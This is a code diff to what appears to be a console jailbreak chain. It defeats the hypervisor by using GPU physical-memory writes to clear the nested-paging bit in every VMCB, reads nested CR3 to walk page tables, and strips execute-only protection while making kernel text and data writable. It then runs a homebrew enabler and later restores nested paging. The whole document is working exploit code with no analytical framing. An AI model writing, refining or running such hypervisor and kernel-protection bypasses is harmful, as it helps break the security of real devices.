@@ -16,6 +16,7 @@ extern "C" int cpuset(cpusetid_t *);
 #include "gpu_dma.h"
 #include "iommu.h"
 #include "patches.h"
+#include "PageTables.h"
 
 #define print(fmt, ...) printf(fmt, ##__VA_ARGS__)
 
@@ -221,7 +222,7 @@ int iommu_selftest(iommu_ctx *iommu, uint64_t dmap) {
 }
 
 int stage3_patch_vmcbs(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
-    print("\n[stage3-iommu] vmcb patch via IOMMU\n");
+    print("\n[stage3] vmcb patch via IOMMU\n");
     if (ctx->vmcb_count == 0) return -1;
 
     int cur = sceKernelGetCurrentCpu();
@@ -234,7 +235,11 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
         //iommu_write8_pa(iommu, pa + 0x08, 0x0004000000000000ULL);
         //iommu_write8_pa(iommu, pa + 0x10, 0x000000000000000FULL);
         //iommu_write8_pa(iommu, pa + 0x58, 0x0000000000000001ULL);
-        iommu_write8_pa(iommu, pa + 0x90, 0x0000000000000000ULL);
+        //iommu_write8_pa(iommu, pa + 0x90, 0x0000000000000000ULL);
+
+        auto vmcb_90 = gpu_read_phys8(pa + 0x90);
+        vmcb_90 &= ~1ULL; // Disable NP_ENABLE bit
+        gpu_write_phys8(pa + 0x90, vmcb_90);
 
         print("  vmcb[%2d] patched (pa=0x%lx)\n", i, pa);
     }
@@ -243,6 +248,21 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
 
     ctx->vmcbs_patched = 1;
     print("  done, %d cores\n", ctx->vmcb_count);
+    return 0;
+}
+
+uint64_t get_nested_CR3(hv_defeat_ctx *ctx)
+{
+    for (int i = 0; i < ctx->vmcb_count; i++) {
+        uint64_t vmcb_pa = ctx->vmcb_pas[i];
+        uint64_t ncr3 = gpu_read_phys8(vmcb_pa + 0xB0); // HV_VMCB_NCTR3_OFF = 0xB0
+        if (ncr3 && !(ncr3 & 0xFFF)) {
+            std::print("  [vmcb] slot %d @ 0x%016lx nCR3=0x%016lx\n",
+                       i, vmcb_pa, ncr3);
+            return ncr3;
+        }
+    }
+    std::print("  [vmcb] no VMCB with valid nCR3 found\n");
     return 0;
 }
 
@@ -255,51 +275,24 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
     uint64_t read_2 = 0;
     kernel_copyout(pmap, &read_2, sizeof(read_2));
     kernel_copyout(pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), &read_2, 8);
-	
-    uint64_t start = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
-    uint64_t end = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
-    int n = 0;
 
-    for (uint64_t a = start; a < end; a += 0x1000) {
-        uint64_t pde, pde_a = find_pde(pmap, a, &pde);
-        if (pde_a != ~0ULL) {
-            CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
-            kernel_copyin(&pde, pde_a, sizeof(pde));
-            uint64_t read = 0;
-            kernel_copyout(pde_a, &read, sizeof(read));
-						
-        }
-        uint64_t pte, pte_a = find_pte(pmap, a, &pte);
-        if (pte_a != ~0ULL) {
-            CLEAR_PDE_BIT(pte, XOTEXT); SET_PDE_BIT(pte, RW);
-            kernel_copyin(&pte, pte_a, sizeof(pte));
-            uint64_t read3 = 0;
-            kernel_copyout(pte_a, &read3, sizeof(read3));
-        }
-        n++;
-    }
-    print("  %d pages on ktext\n", n);
+    const auto t0 = std::chrono::high_resolution_clock::now();
 
-    start = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
-    end = (uint64_t)KERNEL_ADDRESS_DATA_BASE + 0x08000000;
-    for (uint64_t a = start; a < end; a += 0x1000) {
-        uint64_t pde, pde_a = find_pde(pmap, a, &pde);
-        if (pde_a != ~0ULL) {
-            SET_PDE_BIT(pde, RW);
-            kernel_copyin(&pde, pde_a, sizeof(pde));
-            uint64_t read = 0;
-            kernel_copyout(pde_a, &read, sizeof(read));
-        }
-        uint64_t pte, pte_a = find_pte(pmap, a, &pte);
-        if (pte_a != ~0ULL) {
-            SET_PDE_BIT(pte, RW);
-            kernel_copyin(&pte, pte_a, sizeof(pte));
-            uint64_t read3 = 0;
-            kernel_copyout(pte_a, &read3, sizeof(read3));
-        }
-        n++;
-    }
-    print("  %d pages on kdata\n", n);
+    PageTables pt(read_2, get_nested_CR3(ctx));
+
+    PTE clear{}, set{};
+    clear.xotext = 1;
+    set.write    = 1;
+    int count = pt.patch(
+        (uint64_t)KERNEL_ADDRESS_TEXT_BASE,
+        (uint64_t)KERNEL_ADDRESS_DATA_BASE + 0x08000000,
+        clear, set);
+
+    const auto t1 = std::chrono::high_resolution_clock::now();
+    const auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
+
+    print("Cleared XOTEXT & Set R/W on %d pages in %lldms\n", count, duration);
+
     return 0;
 }
 
@@ -497,6 +490,30 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
     return ret;
 }
 
+int stage8_enable_npt(hv_defeat_ctx *ctx)
+{
+    print("\n[stage8] enable NPT again.\n");
+    if (ctx->vmcb_count == 0) return -1;
+
+    int cur = sceKernelGetCurrentCpu();
+    pin_to_core(cur);
+
+    for (int i = 0; i < ctx->vmcb_count; i++) {
+        uint64_t pa = ctx->vmcb_pas[i];
+
+        auto vmcb_90 = gpu_read_phys8(pa + 0x90);
+        vmcb_90 |= 1ULL; // Enable NP_ENABLE bit
+        gpu_write_phys8(pa + 0x90, vmcb_90);
+
+        print("  vmcb[%2d] restored NPT (pa=0x%lx)\n", i, pa);
+    }
+
+    pin_to_core(9);
+
+    print("  done, %d cores\n", ctx->vmcb_count);
+    return 0;
+}
+
 int run_hv_defeat(void) {
     hv_defeat_ctx ctx;
     memset(&ctx, 0, sizeof(ctx));
@@ -536,6 +553,7 @@ int run_hv_defeat(void) {
 
     if ((r = stage2_find_vmcbs(&ctx))) return r;
 
+    // Skipped in exchange for NPT walk
     if ((r = stage3_patch_vmcbs(&ctx, &iommu))) return r;
    
     if ((r = stage3b_remove_xotext(&ctx))) return r;
@@ -575,6 +593,8 @@ int run_hv_defeat(void) {
     //clear_smap_smep_nda(&ctx);
 
     stage7_run_hen(&ctx);
+
+    if ((r = stage8_enable_npt(&ctx))) return r;
 
     uint32_t fw_ver = kernel_get_fw_version();
     uint32_t fw_major = (fw_ver & 0xFF000000) >> 24;
